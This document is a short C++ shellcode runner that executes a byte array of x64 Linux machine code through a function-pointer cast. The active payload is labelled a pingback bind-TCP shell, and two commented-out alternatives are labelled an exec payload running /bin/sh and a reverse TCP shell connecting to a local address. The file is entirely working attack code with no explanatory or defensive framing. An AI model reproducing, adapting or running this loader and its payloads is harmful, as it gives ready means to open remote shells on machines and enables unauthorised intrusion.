#include <iostream>

// linux/x64/pingback_bind_tcp
unsigned char payload[] = 
"\x56\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
"\x85\xc0\x78\x52\x48\x97\x48\xc7\xc1\x02\x00\x11\x5c\x51\x48"
"\x89\xe6\x54\x5e\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x6a\x32\x58"
"\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x99\x52\x52\x54\x5e\x6a\x1c"
"\x48\x8d\x14\x24\x0f\x05\x48\x97\x6a\x10\x5a\xe8\x10\x00\x00"
"\x00\x96\x33\xfd\x16\x90\xd2\x4a\x84\xa1\x8b\x4c\x22\xd4\x95"
"\x68\xed\x5e\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x6a"
"\x01\x5f\x0f\x05";

// linux/x64/exec
/*
unsigned char payload[] = 
"\x48\x31\xff\x48\x89\xfe\x6a\x75\x58\x0f\x05\x48\x31\xff\x48"
"\x89\xfe\x6a\x77\x58\x0f\x05\x6a\x3b\x58\x99\x48\xbb\x2f\x62"
"\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00"
"\x48\x89\xe6\x52\xe8\x13\x00\x00\x00\x65\x63\x68\x6f\x20\x48"
"\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x20\x21\x00\x56\x57"
"\x48\x89\xe6\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05";
*/

// linux/x64/shell_reverse_tcp
/*
unsigned char payload[] = 
"\x48\x31\xff\x48\x89\xfe\x48\x89\xf8\xb0\x71\x0f\x05\x48\xbf"
"\x71\x77\x4d\x44\x42\x6f\x72\x57\x56\x57\x48\x89\xe7\x66\xbe"
"\xed\x01\x6a\x53\x58\x0f\x05\x48\x31\xd2\xb2\xa1\x48\x89\xd0"
"\x0f\x05\x66\xbe\x2e\x2e\x56\x48\x89\xe7\x6a\x45\x5b\x6a\x50"
"\x58\x0f\x05\xfe\xcb\x75\xf7\x6a\x2e\x48\x89\xe7\x48\x89\xd0"
"\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a"
"\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f"
"\x05";
*/

int main() {

    void (* run)() = (void (*)()) payload;

    run();
    return 0;
}
